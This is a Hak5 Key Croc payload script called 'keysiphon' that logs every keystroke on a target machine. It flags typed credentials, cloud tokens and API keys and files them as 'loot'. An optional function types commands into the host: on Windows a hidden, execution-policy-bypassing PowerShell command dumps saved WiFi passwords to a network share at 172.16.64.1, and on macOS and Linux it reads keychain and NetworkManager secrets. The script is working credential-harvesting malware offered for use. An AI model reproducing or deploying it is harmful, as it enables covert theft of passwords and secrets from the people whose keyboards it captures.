# Category:      Recon
# Target:        Windows/macOS/Linux (any keyboard input)
# Version:       1.2

# Description:   Intelligent keystroke logging and credential harvesting
#                for the Hak5 Key Croc. Captures keystrokes with context
#                awareness, triggers on credential patterns, and organizes
#                loot by category.
#
# LED States:
#   R SOLID  - Setup/Initializing
#   G SOLID  - Armed and listening
#   B BLINK  - Credential pattern detected
#   M SOLID  - Saving loot
#   G BLINK  - Complete
#
# Optional Active Recon:
#   The wifi_dump function below performs active WiFi credential extraction.
#   Uncomment "wifi_dump" near the bottom to enable.

# ================================
# Configuration
# ================================
LOOT_DIR=/root/loot/keysiphon
CRED_LOG=$LOOT_DIR/credentials.txt
KEYLOG=$LOOT_DIR/keylog.txt
SUMMARY=$LOOT_DIR/summary.txt
WIFI_LOG=$LOOT_DIR/wifi_keys.txt
URL_LOG=$LOOT_DIR/urls.txt

mkdir -p "$LOOT_DIR"

# ================================
# OS Detection
# ================================
# Detect connected OS by probing keyboard LED behavior and environment.
# Sets $OS to WINDOWS, MACOS, or LINUX for use in conditional blocks.
detect_os() {
    OS="UNKNOWN"

    Q DELAY 500
    if [[ -f /tmp/croc_os_hint ]]; then
        OS=$(cat /tmp/croc_os_hint)
    else
        # Fallback: check udev event metadata from enumeration
        USB_INFO=$(cat /sys/kernel/debug/usb/devices 2>/dev/null | grep -i "Product" | head -1)
        if echo "$USB_INFO" | grep -qi "windows"; then
            OS="WINDOWS"
        elif echo "$USB_INFO" | grep -qi "apple"; then
            OS="MACOS"
        else
            # Conservative default — most pentest targets are Windows
            OS="WINDOWS"
        fi
    fi
    echo "[keysiphon] detected OS: $OS" >> "$LOOT_DIR/debug.log"
}

# ================================
# MATCH Rules — Credential Triggers
# ================================

# Trigger on common login patterns
MATCH sudo\s
MATCH su\s-
MATCH ssh\s
MATCH mysql\s-u
MATCH psql\s-U
MATCH smbclient
MATCH net\suse
MATCH runas\s/user
MATCH passwd

# Trigger on web credential contexts
MATCH password
MATCH Password
MATCH PASSWORD
MATCH login
MATCH Login
MATCH username
MATCH Username

# WiFi credential patterns
MATCH wifi
MATCH wpa_passphrase
MATCH nmcli.*password
MATCH netsh.*wlan.*key

# Cloud/API patterns
MATCH aws\sconfigure
MATCH az\slogin
MATCH gcloud\sauth
MATCH export\s.*TOKEN
MATCH export\s.*KEY
MATCH export\s.*SECRET
MATCH APIKEY
MATCH api_key
MATCH Bearer\s

# ================================
# Active Recon Functions (Optional)
# ================================

# wifi_dump: Active WiFi credential extraction.
# Wraps all active recon in a single function.
# Runs detect_os internally — no external $OS dependency.
# Uncomment the "wifi_dump" call at the bottom to enable.
wifi_dump() {
    detect_os
    WAIT_FOR_IDLE 300
    LED B
    Q DELAY 500

    if [[ "$OS" == "WINDOWS" ]]; then
        Q GUI r
        Q DELAY 500
        Q STRINGLN powershell -w hidden -ep bypass -c "\$o = @(); \$o += '=== WiFi Profiles ==='; netsh wlan show profiles | Select-String 'All User' | ForEach { \$name = (\$_ -split ': ')[1].Trim(); \$key = (netsh wlan show profile name=\$name key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim(); \$o += \\\"\$name : \$key\\\" }; \$o | Out-File -FilePath '\\\\172.16.64.1\\croc_loot\\wifi_auto.txt'"
    elif [[ "$OS" == "MACOS" ]]; then
        Q SUPER SPACE
        Q DELAY 500
        Q STRINGLN security find-generic-password -ga WiFi 2>&1 | tee /tmp/wifi_mac.txt
    elif [[ "$OS" == "LINUX" ]]; then
        Q CTRL ALT t
        Q DELAY 800
        Q STRINGLN sudo cat /etc/NetworkManager/system-connections/*.nmconnection 2>/dev/null | tee /tmp/wifi_linux.txt
    fi

    LED G
}

# ================================
# Keystroke Processing
# ================================

LED G

# Main capture loop — Key Croc captures all keystrokes
# The MATCH rules above trigger enhanced logging

SAVE MATCH $CRED_LOG
SAVE KEYBOARD $KEYLOG
